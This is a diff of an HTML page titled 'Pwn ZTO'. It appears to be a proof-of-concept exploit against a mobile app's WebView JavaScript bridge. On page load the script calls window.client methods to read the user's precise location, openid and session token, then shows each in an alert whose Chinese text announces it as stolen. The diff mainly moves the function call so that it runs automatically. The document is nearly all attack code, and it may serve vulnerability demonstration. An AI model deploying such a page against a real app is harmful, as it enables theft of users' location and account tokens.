@@ -5,20 +5,18 @@
     <title>Pwn ZTO </title>
 </head>
 <body>
-
 <p id="content">attack ZTO </p>
 <script>
+ starZTO();   
     
  function starZTO() {
-   alert(window.client.getVersion());
-     
+   alert(window.client.getVersion());   
+   
    var stealAddr = window.client.getLocationAddress();
    alert('窃取到您的实时精确地址位置:'+ stealAddr);
-     
-   var window.client.openId=getOpenId();
+  
+   var openId=window.client.openId();
   alert('窃取到您的openid:'+ openId);  
-     
- 
      
    var stealToken = window.client.getToken();
    alert('窃取到您的token:'+ stealToken);
@@ -28,9 +26,7 @@
 
      
  } 
-    
-starZTO();
-    
+     
 </script>
 </body>
 </html>
